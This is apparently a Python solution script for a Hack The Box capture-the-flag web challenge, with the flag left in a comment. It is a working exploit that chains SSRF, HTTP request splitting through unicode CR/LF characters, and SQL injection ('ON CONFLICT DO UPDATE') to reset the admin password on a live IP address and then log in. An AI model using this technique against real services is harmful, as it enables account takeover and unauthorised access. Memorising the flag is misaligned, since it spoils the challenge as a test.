#!/usr/bin/python3


import requests
import sys

def main():

    # this challenge looks like a SSRF
    # to get that one, we need to change
    # some different things about the payload
    # for the login as super user or admin

    baseUrl = "127.0.0.1/";
    s = "\u0120"; # s is space
    r = "\u010D"; # \r
    n = "\u010A"; # \n
    sic = "%27";  # singleInvertedConverted
    dic = "%22";  # double inverted comma
    username = 'admin';

    deleteAdmin = "DROP" + s + "users" + s + "IF" + s + "EXISTS" + s + "admin;"
    password = "test')" + s + "ON" + s + "CONFLICT" + s + "(username)" + s + "DO" + s + "UPDATE" + s + "SET" + s + "password" + s + "=" + "%27test%27;"

    username = username.replace(" ", s).replace("'", sic).replace('"', dic)
    password = password.replace(" ", s).replace("'", sic).replace('"', dic)

    content_length = len(username) + len(password) + 19


    rn = r + n
    httpTag = "HTTP/1.1"
    hostHeader = "Host:" + s + "127.0.0.1"
    postReqTag = "POST" + s + "/register"
    contentTypeHeader = "Content-Type:" + s + "application/x-www-form-urlencoded"
    contentLengthHeader = "Content-Length:" + s + str(content_length)
    connectionCloseHeader = "Connection:" + s + "close"
    payloadUrl = baseUrl + s + httpTag + rn + hostHeader + rn + rn + postReqTag + s + httpTag + rn + hostHeader + rn + contentTypeHeader + rn + contentLengthHeader + rn + rn + "username=" + username + "&password=" + password + rn + rn + "GET" + s


    # print(payloadUrl)
    post_request_payload = { "endpoint": payloadUrl, "city": "Guayaquil", "country": "EC"}
    print("request payload: ", post_request_payload)

    headers =  {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://142.93.33.226:31883/',
            'Content-Type': 'application/json',
            'Origin': 'http://142.93.33.226:31883',
            'Content-Length': '67',
            'Connection': 'close'
        }
    payload = {"endpoint":post_request_payload,"city":"Guayaquil","country":"EC"}
    sess = requests.Session()
    ress = sess.post(url="http://142.93.33.226:31883/api/weather",headers=headers, json=payload)
    print(ress.status_code)
    print(ress.text)
    
    
    print(requests.post("http://142.93.33.226:31883/login", data={"username":"admin", "password":"test"}).text)


if __name__ == "__main__":
    try:
        main()#HTB{w3lc0m3_t0_th3_p1p3_dr34m}
    except Exception as e:
        print(str(e))


